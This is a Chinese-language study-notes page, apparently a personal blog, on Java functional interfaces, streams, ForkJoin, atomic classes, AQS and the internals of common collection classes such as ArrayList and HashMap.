<h2 id="四大函数式接口"><a href="#四大函数式接口" class="headerlink" title="四大函数式接口"></a>四大函数式接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数式接口：有一个输入参数，有一个输出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:04 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Function&lt;String, String&gt; function = new Function&lt;String, String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public String apply(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//                return s;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        function.apply(&quot;100&quot;);</span></span><br><span class="line">        <span class="type">Function</span> <span class="variable">function</span> <span class="operator">=</span> (str) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(function.apply(<span class="string">&quot;asd&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Predicate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 断定型接口： 有一个输入参数， 返回值为boolean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:25 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = new Predicate&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public boolean test(String s) &#123;</span></span><br><span class="line"><span class="comment">//                return !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = (s)-&gt; !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line">        Predicate&lt;String&gt; predicate = String::isEmpty;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line">        System.out.println(predicate.test(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Consumer 消费型接口： 只有输入，没有返回值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:32 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Consumer&lt;String&gt; consumer = new Consumer&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void accept(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        consumer.accept(&quot;sss&quot;);</span></span><br><span class="line"></span><br><span class="line">        Consumer&lt;String&gt; consumer = System.out::println;</span><br><span class="line">        consumer.accept(<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Supplier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * supplier 供给型接口， 没有参数只有返回值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:33 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Supplier&lt;Integer&gt; supplier = new Supplier&lt;Integer&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public Integer get() &#123;</span></span><br><span class="line"><span class="comment">//                return 1024;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        System.out.println(supplier.get());</span></span><br><span class="line"></span><br><span class="line">        Supplier&lt;Integer&gt; supplier = ()-&gt;<span class="number">1024</span>;</span><br><span class="line">        System.out.println(supplier.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Stream流式计算"><a href="#Stream流式计算" class="headerlink" title="Stream流式计算"></a>Stream流式计算</h2><p>集合、MySQL本质就是存储东西的; 计算都应该交给流来操作;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Stream&lt;P_OUT&gt; <span class="title function_">filter</span><span class="params">(Predicate&lt;? <span class="built_in">super</span> P_OUT&gt; predicate)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(predicate);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StatelessOp</span>&lt;P_OUT, P_OUT&gt;(<span class="built_in">this</span>, StreamShape.REFERENCE,</span><br><span class="line">                                     StreamOpFlag.NOT_SIZED) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            Sink&lt;P_OUT&gt; <span class="title function_">opWrapSink</span><span class="params">(<span class="type">int</span> flags, Sink&lt;P_OUT&gt; sink)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Sink</span>.ChainedReference&lt;P_OUT, P_OUT&gt;(sink) &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">begin</span><span class="params">(<span class="type">long</span> size)</span> &#123;</span><br><span class="line">                        downstream.begin(-<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(P_OUT u)</span> &#123;</span><br><span class="line">                        <span class="comment">//关键代码, 由断定型接口来晒选</span></span><br><span class="line">                        <span class="keyword">if</span> (predicate.test(u))</span><br><span class="line">                            downstream.accept(u);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="ForkJoin"><a href="#ForkJoin" class="headerlink" title="ForkJoin"></a>ForkJoin</h2><p>Jdk1.7 ,并发执行任务,提高效率; 大数据量;  工作窃取;  B线程执行完会去拿A的线程没执行完的任务; 线程里面的任务是双端队列,两端都可以取到任务; </p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848164.png" alt="image-20210427072722808" style="zoom:50%;" />

<p>大数据: Map Reduce(把大任务拆分成小任务)</p>
<p>fork()：开启一个新线程（或是重用线程池内的空闲线程），将任务交给该线程处理。<br>join()：等待该任务的处理线程处理完毕，获得返回值。</p>
<h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2><p>completableFuture可以有返回值也可以没有, 也是新建线程去处理</p>
<h2 id="Atomic原子类"><a href="#Atomic原子类" class="headerlink" title="Atomic原子类"></a>Atomic原子类</h2><p>具有原子&#x2F;原子操作特征的类;使用 AtomicInteger 之后，不用对 increment() 方法加锁也可以保证线程安全;底层CAS实现; 在内存中修改值, Unsafe类,里面基本都是调用native方法;</p>
<p>AtomicInteger 类主要利用 CAS (compare and swap) + volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。</p>
<h3 id="JUC-包中的原子类是哪-4-类"><a href="#JUC-包中的原子类是哪-4-类" class="headerlink" title="JUC 包中的原子类是哪 4 类?"></a>JUC 包中的原子类是哪 4 类?</h3><p><strong>基本类型</strong></p>
<p>使用原子的方式更新基本类型</p>
<ul>
<li><code>AtomicInteger</code>：整形原子类</li>
<li><code>AtomicLong</code>：长整型原子类</li>
<li><code>AtomicBoolean</code>：布尔型原子类</li>
</ul>
<p><strong>数组类型</strong></p>
<p>使用原子的方式更新数组里的某个元素</p>
<ul>
<li><code>AtomicIntegerArray</code>：整形数组原子类</li>
<li><code>AtomicLongArray</code>：长整形数组原子类</li>
<li><code>AtomicReferenceArray</code>：引用类型数组原子类</li>
</ul>
<p><strong>引用类型</strong></p>
<ul>
<li><code>AtomicReference</code>：引用类型原子类</li>
<li><code>AtomicStampedReference</code>：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。</li>
<li><code>AtomicMarkableReference</code> ：原子更新带有标记位的引用类型</li>
</ul>
<p><strong>对象的属性修改类型</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code>：原子更新整形字段的更新器</li>
<li><code>AtomicLongFieldUpdater</code>：原子更新长整形字段的更新器</li>
<li><code>AtomicReferenceFieldUpdater</code>：原子更新引用类型字段的更新器</li>
</ul>
<h3 id="AtomicInteger的使用"><a href="#AtomicInteger的使用" class="headerlink" title="AtomicInteger的使用"></a>AtomicInteger的使用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">()</span> <span class="comment">//获取当前的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndSet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//获取当前的值，并设置新的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndIncrement</span><span class="params">()</span><span class="comment">//获取当前的值，并自增</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndDecrement</span><span class="params">()</span> <span class="comment">//获取当前的值，并自减</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndAdd</span><span class="params">(<span class="type">int</span> delta)</span> <span class="comment">//获取当前的值，并加上预期的值</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">compareAndSet</span><span class="params">(<span class="type">int</span> expect, <span class="type">int</span> update)</span> <span class="comment">//如果输入的数值等于预期值，则以原子方式将该值设置为输入值（update）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lazySet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//最终设置为newValue,使用 lazySet 设置之后可能导致其他线程在之后的一小段时间内还是可以读到旧的值。</span></span><br></pre></td></tr></table></figure>

<h3 id="AtomicInteger类的原理"><a href="#AtomicInteger类的原理" class="headerlink" title="AtomicInteger类的原理"></a>AtomicInteger类的原理</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setup to use Unsafe.compareAndSwapInt for updates（更新操作时提供“比较并替换”的作用）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> Unsafe.getUnsafe();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> valueOffset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        valueOffset = unsafe.objectFieldOffset</span><br><span class="line">            (AtomicInteger.class.getDeclaredField(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(ex); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> value;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>AtomicInteger 类主要利用 CAS (compare and swap) + volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。</p>
<p>CAS 的原理是拿期望的值和原本的一个值作比较，如果相同则更新成新的值。UnSafe 类的 objectFieldOffset() 方法是一个本地方法，这个方法是用来拿到“原来的值”的内存地址，返回值是 valueOffset。另外 value 是一个 volatile 变量，在内存中可见，因此 JVM 可以保证任何时刻任何线程总能拿到该变量的最新值。</p>
<h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><p>AQS 的全称为（AbstractQueuedSynchronizer），这个类在java.util.concurrent.locks包下面;</p>
<p>AQS 是一个用来构建锁和同步器的框架，使用 AQS 能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的 ReentrantLock，Semaphore，其他的诸如 ReentrantReadWriteLock，SynchronousQueue，FutureTask 等等皆是基于 AQS 的。当然，我们自己也能利用 AQS 非常轻松容易地构造出符合我们自己需求的同步器。</p>
<h3 id="AQS原理分析"><a href="#AQS原理分析" class="headerlink" title="AQS原理分析"></a>AQS原理分析</h3><p>AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 CLH 队列锁实现的，即将暂时获取不到锁的线程加入到队列中。</p>
<p>CLH(Craig,Landin,and Hagersten)队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。</p>
<p>AQS 使用一个 int 成员变量来表示同步状态，通过内置的 FIFO 队列来完成获取资源线程的排队工作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848262.png" alt="AQS原理图"></p>
<h3 id="AQS对资源的共享方式"><a href="#AQS对资源的共享方式" class="headerlink" title="AQS对资源的共享方式"></a>AQS对资源的共享方式</h3><p><strong>AQS 定义两种资源共享方式</strong></p>
<ul>
<li>Exclusive（独占）：只有一个线程能执行，如ReentrantLock<ul>
<li>公平锁：按照线程在队列中的排队顺序，先到者先拿到锁</li>
<li>非公平锁：当线程要获取锁时，无视队列顺序直接去抢锁，谁抢到就是谁的</li>
</ul>
</li>
<li>Share（共享）：多个线程可同时执行，如CountDownLatch、Semaphore、 CyclicBarrier、ReadWriteLock 我们都会在后面讲到。</li>
</ul>
<p>ReentrantReadWriteLock 可以看成是组合式，因为 ReentrantReadWriteLock 也就是读写锁允许多个线程同时对某一资源进行读。</p>
<p>不同的自定义同步器争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源 state 的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队&#x2F;唤醒出队等），AQS 已经在顶层实现好了。</p>
<h4 id="AQS底层使用模版方法模式"><a href="#AQS底层使用模版方法模式" class="headerlink" title="AQS底层使用模版方法模式"></a>AQS底层使用模版方法模式</h4><p>同步器的设计是基于模板方法模式的，如果需要自定义同步器一般的方式是这样（模板方法模式很经典的一个应用）：</p>
<ol>
<li>使用者继承 AbstractQueuedSynchronizer 并重写指定的方法。（这些重写方法很简单，无非是对于共享资源 state 的获取和释放）</li>
<li>将 AQS 组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。</li>
</ol>
<p>这和我们以往通过实现接口的方式有很大区别，这是模板方法模式很经典的一个运用。</p>
<p>AQS 使用了模板方法模式，自定义同步器时需要重写下面几个 AQS 提供的模板方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isHeldExclusively()<span class="comment">//该线程是否正在独占资源。只有用到condition才需要去实现它。</span></span><br><span class="line">tryAcquire(<span class="type">int</span>)<span class="comment">//独占方式。尝试获取资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryRelease(<span class="type">int</span>)<span class="comment">//独占方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryAcquireShared(<span class="type">int</span>)<span class="comment">//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。</span></span><br><span class="line">tryReleaseShared(<span class="type">int</span>)<span class="comment">//共享方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br><span class="line">Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p>默认情况下，每个方法都抛出 UnsupportedOperationException。 这些方法的实现必须是内部线程安全的，并且通常应该简短而不是阻塞。AQS 类中的其他方法都是 final ，所以无法被其他类使用，只有这几个方法可以被其他类使用。</p>
<p>以 ReentrantLock 为例，state 初始化为 0，表示未锁定状态。A 线程 lock()时，会调用 tryAcquire()独占该锁并将 state+1。此后，其他线程再 tryAcquire()时就会失败，直到 A 线程 unlock()到 state&#x3D;0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A 线程自己是可以重复获取此锁的（state 会累加），这就是可重入的概念。但要注意，获取多少次就要释放多么次，这样才能保证 state 是能回到零态的。</p>
<p>再以 CountDownLatch 以例，任务分为 N 个子线程去执行，state 也初始化为 N（注意 N 要与线程个数一致）。这 N 个子线程是并行执行的，每个子线程执行完后countDown() 一次，state 会 CAS(Compare and Swap)减 1。等到所有子线程都执行完后(即 state&#x3D;0)，会 unpark()主调用线程，然后主调用线程就会从 await() 函数返回，继续后余动作。</p>
<p>一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared中的一种即可。但 AQS 也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。</p>
<p>推荐两篇 AQS 原理和相关源码分析的文章：</p>
<ul>
<li><a href="http://www.cnblogs.com/waterystone/p/4920797.html">http://www.cnblogs.com/waterystone/p/4920797.html</a></li>
<li><a href="https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html">https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html</a></li>
</ul>
<h3 id="AQS组件总结"><a href="#AQS组件总结" class="headerlink" title="AQS组件总结"></a>AQS组件总结</h3><ul>
<li>Semaphore(信号量)-允许多个线程同时访问： synchronized 和 ReentrantLock 都是一次只允许一个线程访问某个资源，Semaphore(信号量)可以指定多个线程同时访问某个资源。</li>
<li>CountDownLatch（倒计时器）： CountDownLatch 是一个同步工具类，用来协调多个线程之间的同步。这个工具通常用来控制线程等待，它可以让某一个线程等待直到倒计时结束，再开始执行。</li>
<li>CyclicBarrier(循环栅栏)： CyclicBarrier 和 CountDownLatch 非常类似，它也可以实现线程间的技术等待，但是它的功能比 CountDownLatch 更加复杂和强大。主要应用场景和 CountDownLatch 类似。CyclicBarrier 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是，让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。CyclicBarrier 默认的构造方法是 CyclicBarrier(int parties)，其参数表示屏障拦截的线程数量，每个线程调用 await() 方法告诉 CyclicBarrier 我已经到达了屏障，然后当前线程被阻塞。</li>
</ul>
<h3 id="用过CountDownLatch吗"><a href="#用过CountDownLatch吗" class="headerlink" title="用过CountDownLatch吗"></a>用过CountDownLatch吗</h3><p>CountDownLatch 的作用就是 允许 count 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。之前在项目中，有一个使用多线程读取多个文件处理的场景，我用到了 CountDownLatch 。具体场景是下面这样的：</p>
<p>我们要读取处理 6 个文件，这 6 个任务都是没有执行顺序依赖的任务，但是我们需要返回给用户的时候将这几个文件的处理的结果进行统计整理。</p>
<p>为此我们定义了一个线程池和 count 为 6 的CountDownLatch对象 。使用线程池处理读取任务，每一个线程处理完之后就将 count-1，调用CountDownLatch对象的 await()方法，直到所有文件读取完之后，才会接着执行后面的逻辑。</p>
<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848279.png" alt="img"></p>
<h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>初始大小10,扩容就是1.5倍左右, 15, 33 , 49;线程不安全,适用于频繁的查找工作;list尾部会预留一些空间; 插入和删除元素需要复制,浪费性能; </p>
<p>实现了RandomAccess接口(在 binarySearch()) 方法中，它要判断传入的 list 是否 RamdomAccess 的实例，如果是，调用indexedBinarySearch()方法，如果不是，那么调用iteratorBinarySearch()方法);实现了cloneable和serializable接口</p>
<p>JDK7 new无参构造的ArrayList对象时，直接创建了长度是10的Object[]数组elementData 。jdk7中的ArrayList的对象的创建<strong>类似于单例的饿汉式</strong>，而jdk8中的ArrayList的对象的创建<strong>类似于单例的懒汉式</strong>。</p>
<h4 id="为什么-ArrayList-的-elementData-加上-transient-修饰？"><a href="#为什么-ArrayList-的-elementData-加上-transient-修饰？" class="headerlink" title="为什么 ArrayList 的 elementData 加上 transient 修饰？"></a>为什么 ArrayList 的 elementData 加上 transient 修饰？</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 private transient Object[] elementData;</span><br></pre></td></tr></table></figure>

<p>再看一下 ArrayList 的定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;</span><br><span class="line">2	implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure>

<p>可以看到 ArrayList 实现了 Serializable 接口，这意味着 ArrayList 支持序列</p>
<p>化。transient 的作用是说不希望 elementData 数组被序列化，重写了 writeObject 实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOE xception&#123; </span><br><span class="line">2  *// Write out element count, and any hidden stuff* </span><br><span class="line">3  int expectedModCount = modCount; </span><br><span class="line">4  s.defaultWriteObject(); </span><br><span class="line">5  *// Write out array length* </span><br><span class="line">6  s.writeInt(elementData.length); </span><br><span class="line">7  *// Write out all elements in the proper order.* </span><br><span class="line">8  for (int i=0; i&lt;size; i++) </span><br><span class="line">9  s.writeObject(elementData[i]); </span><br><span class="line">10  if (modCount != expectedModCount) &#123; </span><br><span class="line">11  throw new ConcurrentModificationException();</span><br><span class="line">12 &#125;</span><br></pre></td></tr></table></figure>

<p>每次序列化时，先调用 defaultWriteObject() 方法序列化 ArrayList 中的非transient 元素，然后遍历 elementData，只序列化已存入的元素，这样既加快了序列化的速度，又减小了序列化之后的文件大小。</p>
<h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><p>jdk1.6是双向循环链表,jdk1.7为双向链表;不保证线程安全;存放前驱和后继的引用会浪费空间;没有实现RandomAccess接口;实现List接口和Deque接口;Collections类中的synchronizedList方法;</p>
<h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>初始大小为10,扩容是2倍;list的古老实现类;Vector 的所有方法加上了 synchronized 关键字,线程安全;</p>
<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>继承自vector;线程安全;</p>
<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue是非线程安全的，所以Java提供了PriorityBlockingQueue（实现<a href="http://www.journaldev.com/1034/java-blockingqueue-example-implementing-producer-consumer-problem">BlockingQueue接口</a>）用于<a href="http://www.journaldev.com/1079/java-thread-tutorial">Java多线程环境</a>;默认小顶堆实现,底层为数组;</p>
<h3 id="ArrayDeque"><a href="#ArrayDeque" class="headerlink" title="ArrayDeque"></a>ArrayDeque</h3><p>初始为16,扩容两倍;双端队列,底层为循环数组;不能添加null值;add方法就是调用addLast方法;getLast,getFirst,addFirst,pollFirst,pollLast;判断队满(tail &#x3D; (tail + 1) &amp; (elements.length - 1)) &#x3D;&#x3D; head;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848289.png" alt="img" style="zoom: 67%;" />

<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>检索元素效率低下，删除和插入效率高，插入和删除不会引起元素位置改变</p>
<h3 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h3><p>TreeSet 底层使用红黑树，能够按照添加元素的顺序进行遍历，排序的方式有自然排序和定制排序;有序的，并且没有重复元素的集合;非线程安全;可序列化;</p>
<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>HashMap 相对于  HashSet 较快，因为它是使用唯一的键获取对象;</p>
<p>HashSet 底层就是基于 HashMap 实现的。（HashSet 的源码非常非常少，因为除了 clone()、writeObject()、readObject()是 HashSet 自己不得不实现之外，其他方法都是直接调用 HashMap 中的方法。</p>
<table>
<thead>
<tr>
<th>HashMap</th>
<th>HashSet</th>
</tr>
</thead>
<tbody><tr>
<td>实现了 Map 接口</td>
<td>实现 Set 接口</td>
</tr>
<tr>
<td>存储键值对</td>
<td>仅存储对象</td>
</tr>
<tr>
<td>调用 put()向 map 中添加元素</td>
<td>调用 add()方法向 Set 中添加元素</td>
</tr>
<tr>
<td>HashMap 使用键（Key）计算 hashcode</td>
<td>HashSet 使用成员对象来计算 hashcode 值，对于两个对象来说 hashcode 可能相同，所以equals()方法用来判断对象的相等性</td>
</tr>
</tbody></table>
<p>当你把对象加入HashSet时，HashSet 会先计算对象的hashcode值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让加入操作成功。</p>
<h3 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h3><p>LinkedHashSet 是 HashSet 的子类，能够按照添加的顺序遍历；</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848337.png" alt="img"></p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>16 0.75 扩容为2倍,尾插法 (jdk1.7用头插法)桶大于64才会树化,当桶小于64则先扩容 单链表 ;允许一个key为null,value可以有多个null; 1.7 先判断是否需要扩容,再插入,1.8 先进行插入,插入完成再判断是否需要扩容; 1.7没有红黑树机制;</p>
<p>扩容机制(1.8) :</p>
<p>假设初始容量为16, hash(key1) &#x3D; 0001,然后计算0001 &amp; 1111&#x3D; 1, 尾插法放到1号位置, hash(key2) &#x3D; 10001, 然后计算10001 &amp; 1111 &#x3D; 1,尾插法放到1号位置, 此时扩容为32, 先判断hash(key1) &amp; 16 &#x3D;&#x3D; 0? 等于0的都放到lohead这队, 然后不等于0的都放到 hihead这一队, lohead放在新表的原来的位置, hihead这队放到新表的j + oldCap位置(原来的位置加上旧表的容量);可以防止死循环问题;</p>
